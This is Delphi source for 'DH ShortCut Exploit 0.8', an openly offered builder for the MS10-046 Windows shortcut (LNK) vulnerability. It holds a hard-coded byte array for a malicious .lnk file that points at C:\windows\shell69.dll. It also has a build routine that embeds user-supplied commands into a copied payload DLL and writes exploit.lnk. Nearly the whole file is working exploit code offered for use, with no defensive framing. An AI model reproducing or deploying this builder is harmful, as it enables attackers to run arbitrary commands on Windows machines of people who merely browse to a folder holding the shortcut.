// DH ShortCut Exploit 0.8
// (C) Doddy Hackman 2016
// Credits :
// Based on : http://www.delphibasics.info/home/delphibasicscounterstrikewireleases/ms10-046cpllnkexploit-lnkvulnerabilitybyparayvx
// Thanks to Paray_Vx

unit shortcut_exploit;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.ComCtrls,
  Vcl.StdCtrls, DH_Tools,
  DH_Builder_Tools, FormAbout, Vcl.Imaging.pngimage, Vcl.ImgList;

type
  TFormHome = class(TForm)
    imgLogo: TImage;
    status: TStatusBar;
    gbEnterCommands: TGroupBox;
    txtCommands: TMemo;
    btnBuild: TButton;
    btnAbout: TButton;
    btnExit: TButton;
    ilIconos: TImageList;
    procedure btnBuildClick(Sender: TObject);
    procedure btnAboutClick(Sender: TObject);
    procedure btnExitClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormHome: TFormHome;

implementation

{$R *.dfm}
// Functions

function message_box(title, message_text, type_message: string): string;
begin
  if not(title = '') and not(message_text = '') and not(type_message = '') then
  begin
    try
      begin
        if (type_message = 'Information') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end
        else if (type_message = 'Warning') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONWARNING);
        end
        else if (type_message = 'Question') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONQUESTION);
        end
        else if (type_message = 'Error') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONERROR);
        end
        else
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end;
        Result := '[+] MessageBox : OK';
      end;
    except
      begin
        Result := '[-] Error';
      end;
    end;
  end
  else
  begin
    Result := '[-] Error';
  end;
end;

function copy_file(archivo1: string; archivo2: string): bool;
begin
  if (FileExists(archivo1)) and not(archivo2 = '') then
  begin
    try
      begin
        CopyFile(PChar(archivo1), PChar(archivo2), False);
        if (FileExists(archivo2)) then
        begin
          Result := True;
        end
        else
        begin
          Result := False;
        end;
      end;
    except
      Result := False;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

//

procedure generate_exploit(filename: string);
const
  size_exploit: integer = 141;
  exploit_code: array [1 .. 141] of Byte = ($4C, $00, $00, $00, $01, $14, $02,
    $00, $00, $00, $00, $00, $C0, $00, $00, $00, $00, $00, $00, $46, $81, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $36, $01, $14, $00, $1F, $50,
    $E0, $4F, $D0, $20, $EA, $3A, $69, $10, $A2, $D8, $08, $00, $2B, $30, $30,
    $9D, $14, $00, $2E, $1E, $20, $20, $EC, $21, $EA, $3A, $69, $10, $A2, $DD,
    $08, $00, $2B, $30, $30, $9D, $0C, $01, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $6A, $00, $00, $00, $00, $00, $00, $20, $00, $3A);
var
  file_now: file;
  i: integer;
  code: TBytes;
  size_dll: integer;
  dll_byte: Array of Byte;
  dll_file: string;
begin

  dll_file := 'C:\windows\shell69.dll';

  code := TEncoding.BigEndianUnicode.GetBytes(dll_file);

  size_dll := High(code) + 1;

  for i := 0 to size_dll do
  begin
    SetLength(dll_byte, Length(dll_byte) + 1);
    dll_byte[High(dll_byte)] := code[i];
  end;

  AssignFile(file_now, filename);
  Rewrite(file_now, 1);

  for i := 1 to size_exploit do
  begin
    BlockWrite(file_now, exploit_code[i], 1);
  end;

  for i := 0 to size_dll do
  begin
    BlockWrite(file_now, dll_byte[i], 1);
  end;

  CloseFile(file_now);
end;

procedure TFormHome.btnAboutClick(Sender: TObject);
begin
  FormAbout.frmAbout.Show;
end;

procedure TFormHome.btnBuildClick(Sender: TObject);
var
  builder: T_DH_Builder_Tools;
  tools: T_DH_Tools;
  code: string;
  separador: string;
  commands_output: string;
begin

  if not(txtCommands.Text = '') then
  begin
    tools := T_DH_Tools.Create();
    commands_output := StringReplace(txtCommands.Text, sLineBreak, ',',
      [rfReplaceAll, rfIgnoreCase]);
    separador := '0x2D64685F736570617261646F722D';
    code := '[commands]' + commands_output + '[commands]';
    copy_file('payload.dll', 'shell69.dll');

    builder := T_DH_Builder_Tools.Create();

    if (builder.write_eof('shell69.dll', separador, separador, code, 123)) then
    begin
      message_box('DH ShortCut Exploit 0.8', 'Payload generated',
        'Information');
    end
    else
    begin
      message_box('DH ShortCut Exploit 0.8',
        'Error generating payload', 'Error');
    end;

    generate_exploit('exploit.lnk');

    builder.Free();
    tools.Free();

  end
  else
  begin
    message_box('DH ShortCut Exploit 0.8', 'Enter Commands', 'Warning');
  end;

end;

procedure TFormHome.btnExitClick(Sender: TObject);
begin
  Application.Terminate();
end;

end.

// The End ?
